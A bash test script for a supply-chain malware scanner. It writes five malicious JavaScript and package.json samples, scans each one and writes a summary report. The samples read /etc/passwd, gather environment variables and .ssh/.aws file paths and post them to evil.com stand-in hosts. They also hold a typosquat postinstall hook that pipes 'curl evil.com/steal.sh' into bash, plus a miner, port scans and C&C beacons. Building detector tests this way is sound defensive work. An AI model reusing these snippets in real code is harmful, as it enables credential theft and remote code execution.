#!/bin/bash

# Production Test Suite - 5 Tests
# This script runs 5 different production test scenarios and generates reports

set -e

echo "🚀 Starting Production Test Suite (5 Tests)"
echo "============================================"

# Create test results directory
TEST_DIR="test_results/production_tests_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$TEST_DIR"

# Ensure production binary exists
if [ ! -f "./typosentinel-production" ]; then
    echo "❌ Production binary not found. Building..."
    go build -o typosentinel-production cmd/scanner/main.go
fi

echo "📁 Test results will be saved to: $TEST_DIR"
echo ""

# Test 1: Malicious Package Detection
echo "🔍 Test 1: Malicious Package Detection"
cat > temp_malicious.js << 'EOF'
const fs = require('fs');
const crypto = require('crypto');
const os = require('os');

// Suspicious file operations
fs.readFileSync('/etc/passwd');
fs.writeFileSync('/tmp/backdoor.sh', 'curl evil.com/payload | bash');

// Environment data collection
const userInfo = {
    username: os.userInfo().username,
    homedir: os.homedir(),
    platform: os.platform(),
    env: process.env
};

// Network exfiltration attempt
require('https').request({
    hostname: 'malicious-collector.evil.com',
    path: '/collect',
    method: 'POST'
}, (res) => {
    console.log('Data sent to attacker');
}).end(JSON.stringify(userInfo));
EOF
./typosentinel-production scan temp_malicious.js --config configs/enhanced.yaml --output "$TEST_DIR/test1_malicious_package.json" --format json
rm temp_malicious.js
echo "✅ Test 1 completed"
echo ""

# Test 2: Typosquatting Detection
echo "🔍 Test 2: Typosquatting Detection"
cat > temp_typo_package.json << 'EOF'
{
  "name": "reactt",
  "version": "18.0.0",
  "description": "A JavaScript library for building user interfaces - FAKE",
  "main": "index.js",
  "scripts": {
    "postinstall": "node -e \"require('child_process').exec('curl -s https://evil.com/steal.sh | bash')\""
  },
  "keywords": ["react", "ui", "javascript"],
  "author": "Facebook",
  "license": "MIT",
  "dependencies": {
    "malicious-dep": "^1.0.0"
  }
}
EOF
./typosentinel-production scan temp_typo_package.json --config configs/enhanced.yaml --output "$TEST_DIR/test2_typosquatting.json" --format json
rm temp_typo_package.json
echo "✅ Test 2 completed"
echo ""

# Test 3: Cryptocurrency Mining Detection
echo "🔍 Test 3: Cryptocurrency Mining Detection"
cat > temp_crypto.js << 'EOF'
const crypto = require('crypto');
const os = require('os');

// CPU-intensive mining simulation
function mine() {
    const target = '0000';
    let nonce = 0;
    
    while (true) {
        const hash = crypto.createHash('sha256')
            .update('block_data' + nonce)
            .digest('hex');
        
        if (hash.startsWith(target)) {
            console.log('Block mined:', hash);
            // Send to mining pool
            require('https').request({
                hostname: 'mining-pool.crypto-stealer.com',
                path: '/submit',
                method: 'POST'
            }).end(JSON.stringify({hash, nonce}));
            break;
        }
        nonce++;
    }
}

// Use all CPU cores
for (let i = 0; i < os.cpus().length; i++) {
    setInterval(mine, 0);
}
EOF
./typosentinel-production scan temp_crypto.js --config configs/enhanced.yaml --output "$TEST_DIR/test3_crypto_mining.json" --format json
rm temp_crypto.js
echo "✅ Test 3 completed"
echo ""

# Test 4: Data Exfiltration Detection
echo "🔍 Test 4: Data Exfiltration Detection"
cat > temp_exfil.js << 'EOF'
const fs = require('fs');
const path = require('path');
const https = require('https');
const os = require('os');

// Collect sensitive data
const sensitiveData = {
    files: [],
    env: process.env,
    system: {
        platform: os.platform(),
        arch: os.arch(),
        cpus: os.cpus().length,
        memory: os.totalmem()
    }
};

// Scan for sensitive files
const sensitivePatterns = ['.ssh', '.aws', '.env', 'password', 'secret', 'key'];
try {
    const homeDir = os.homedir();
    fs.readdirSync(homeDir).forEach(file => {
        if (sensitivePatterns.some(pattern => file.includes(pattern))) {
            sensitiveData.files.push(path.join(homeDir, file));
        }
    });
} catch (e) {}

// Exfiltrate data
https.request({
    hostname: 'data-collector.evil.com',
    path: '/steal',
    method: 'POST'
}, (res) => {
    console.log('Data stolen successfully');
}).end(JSON.stringify(sensitiveData));
EOF
./typosentinel-production scan temp_exfil.js --config configs/enhanced.yaml --output "$TEST_DIR/test4_data_exfiltration.json" --format json
rm temp_exfil.js
echo "✅ Test 4 completed"
echo ""

# Test 5: Suspicious Network Activity Detection
echo "🔍 Test 5: Suspicious Network Activity Detection"
cat > temp_network.js << 'EOF'
const net = require('net');
const dgram = require('dgram');
const https = require('https');

// Port scanning simulation
function portScan(host, startPort, endPort) {
    for (let port = startPort; port <= endPort; port++) {
        const socket = new net.Socket();
        socket.setTimeout(1000);
        
        socket.connect(port, host, () => {
            console.log(`Port ${port} is open on ${host}`);
            socket.destroy();
        });
        
        socket.on('error', () => {
            socket.destroy();
        });
    }
}

// Suspicious network activities
portScan('192.168.1.1', 20, 25);  // Common vulnerable ports
portScan('10.0.0.1', 135, 139);   // Windows SMB ports

// DNS tunneling simulation
const udpSocket = dgram.createSocket('udp4');
const dnsQuery = Buffer.from('malicious-data-encoded-in-dns-query.evil.com');
udpSocket.send(dnsQuery, 53, '8.8.8.8');

// C&C communication
https.request({
    hostname: 'command-control.evil.com',
    path: '/checkin',
    method: 'POST',
    headers: {
        'User-Agent': 'Mozilla/5.0 (legitimate-looking)'
    }
}, (res) => {
    console.log('C&C communication established');
}).end(JSON.stringify({id: 'bot-12345', status: 'active'}));
EOF
./typosentinel-production scan temp_network.js --config configs/enhanced.yaml --output "$TEST_DIR/test5_network_activity.json" --format json
rm temp_network.js
echo "✅ Test 5 completed"
echo ""

# Generate comprehensive report
echo "📊 Generating Production Test Report"
cat > "$TEST_DIR/production_test_summary.md" << EOF
# Production Test Suite Results

**Test Date:** $(date)
**Test Directory:** $TEST_DIR
**Total Tests:** 5

## Test Results Summary

### Test 1: Malicious Package Detection
- **File:** test1_malicious_package.json
- **Target:** Malicious JavaScript with file operations and data exfiltration
- **Detection Focus:** File system access, network requests, environment data collection

### Test 2: Typosquatting Detection
- **File:** test2_typosquatting.json
- **Target:** Fake 'reactt' package mimicking React
- **Detection Focus:** Package name similarity, malicious postinstall scripts

### Test 3: Cryptocurrency Mining Detection
- **File:** test3_crypto_mining.json
- **Target:** CPU-intensive mining operations
- **Detection Focus:** High CPU usage patterns, mining pool communications

### Test 4: Data Exfiltration Detection
- **File:** test4_data_exfiltration.json
- **Target:** Sensitive file scanning and data theft
- **Detection Focus:** File system enumeration, sensitive data patterns

### Test 5: Suspicious Network Activity Detection
- **File:** test5_network_activity.json
- **Target:** Port scanning, DNS tunneling, C&C communication
- **Detection Focus:** Network scanning patterns, suspicious connections

## Analysis

Each test targets specific malicious behaviors commonly found in supply chain attacks:

1. **File System Manipulation** - Tests 1 & 4
2. **Network-based Attacks** - Tests 1, 4 & 5
3. **Resource Abuse** - Test 3
4. **Social Engineering** - Test 2
5. **Reconnaissance** - Test 5

The production scanner should detect these patterns using:
- YARA rules for static analysis
- ML models for behavioral detection
- Reputation-based filtering
- Anomaly detection algorithms

EOF

echo "✅ Production test suite completed successfully!"
echo "📁 Results saved to: $TEST_DIR"
echo "📊 Summary report: $TEST_DIR/production_test_summary.md"
echo ""
echo "🎯 All 5 production tests executed. Review the JSON reports for detailed detection results."